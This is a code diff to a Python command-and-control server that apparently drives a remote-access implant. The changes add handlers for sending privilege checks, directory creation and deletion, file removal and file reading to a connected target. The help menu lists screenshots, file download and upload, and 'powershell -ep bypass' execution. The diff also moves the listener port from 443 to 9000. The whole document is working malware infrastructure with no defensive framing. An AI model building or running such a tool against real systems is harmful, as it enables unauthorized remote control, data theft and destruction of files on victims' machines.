@@ -39,7 +39,7 @@ def connection():
         try:
             print(banner)
             print("-" *40)
-            print(f"           Binding Port: 443")
+            print(f"           Binding Port: 9000")
             print("-" *40)
             # Attenticating Connection
             connection = True
@@ -67,23 +67,30 @@ def connection():
                 
                 elif commands == "help":
                     help_menu = """\033[33m
-|==========================================================|
-|                         HELP MENU                        |
-|==========================================================|
-|  Command               |            Description          |
-|==========================================================|
-|  cd (Dir)              |  Change Directory               |
-|  cd ..                 |  Go back a directory            |
-|  ls -la / ls           |  List all files in current      |
-|                        |  directory                      |
-|  exit                  |  Shutdown C2 Server             |
-|  pwd                   |  Show Current Directory         |
-|  print                 |  Do a Screenshot                |
-|  download              |  Download file to server        |
-|  upload                |  Upload file to target          |
-|  sysinfo/systeminfo    |  Show system information        |
-|  clear                 |  Clear terminal                 |
-|==========================================================|
+|==============================================================|
+|                         HELP MENU                            |
+|==============================================================|
+|  Command                   |            Description          |
+|==============================================================|
+|  cd (Dir)                  |  Change Directory               |
+|  cd ..                     |  Go back a directory            |
+|  ls -la / ls               |  List all files in current      |
+|                            |  directory                      |
+|  exit                      |  Shutdown C2 Server             |
+|  pwd                       |  Show Current Directory         |
+|  print                     |  Do a Screenshot                |
+|  download                  |  Download file to server        |
+|  upload                    |  Upload file to target          |
+|  sysinfo/systeminfo        |  Show system information        |
+|  clear                     |  Clear terminal                 |
+|  whoami /priv              |  Show privilege of current user |
+|  mkdir (Dir)               |  Create a directory             |
+|  rmdir (Dir)               |  Remove a directory             |
+|  rm (file)                 |  Remove a file                  |
+|  cat/type (File)           |  Read a file                    |
+|  powershell -ep bypass -c  | Execute powershell command      |
+|  (Command here)            |                                 |
+|==============================================================|
 \033[m"""
                     print(help_menu)
 
@@ -114,6 +121,29 @@ def connection():
                             data += packet
 
                         print(data.decode('utf-8'))
+                
+
+                elif commands == "whoami /priv":
+                    conn.sendall(commands.encode('utf-8'))
+                    data = conn.recv(1024)
+                    print(data.decode('latin-1'))
+
+
+                elif commands.startswith("mkdir "):
+                    conn.sendall(commands.encode('utf-8'))
+                    data = conn.recv(1024)
+                    print(f"\033[32m[+] {data.decode('utf-8')}\033[m")
+                
+                elif commands.startswith("rm "):
+                    conn.sendall(commands.encode('utf-8'))
+                    data = conn.recv(1024)
+                    print(f"\033[32m[+] {data.decode('utf-8')}\033[m")
+
+                
+                elif commands.startswith("rmdir "):
+                    conn.sendall(commands.encode('utf-8'))
+                    data = conn.recv(1024)
+                    print(f"\033[32m[+] {data.decode('utf-8')}\033[m")
 
 
 
@@ -137,6 +167,25 @@ def connection():
                         print(data.decode('utf-8'))
 
 
+                elif commands.startswith("cat ") or commands.startswith("type "):
+                    conn.sendall(commands.encode('utf-8'))
+
+                    raw_length = conn.recv(4)
+                    if raw_length:
+                        data_length = struct.unpack('>I', raw_length)[0]
+
+
+                        data = b""
+                        while len(data) < data_length:
+                            packet = conn.recv(data_length - len(data))
+                            if not packet:
+                                break
+                            data += packet
+
+                        print(data.decode('utf-8'))    
+                
+
+
                 elif commands == "print":
                     conn.sendall(commands.encode('utf-8'))
                     response = conn.recv(4096)
@@ -152,7 +201,7 @@ def connection():
                         transfer_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         transfer_socket.bind(('0.0.0.0', 443))
                         transfer_socket.listen(1)
-                        print("\033[32m[+] Waiting connection to transfer file...\033[m")
+                        print("\n\033[32m[+] Waiting connection to transfer file...\033[m")
 
                         while True:
                             client_socket, addr = transfer_socket.accept()
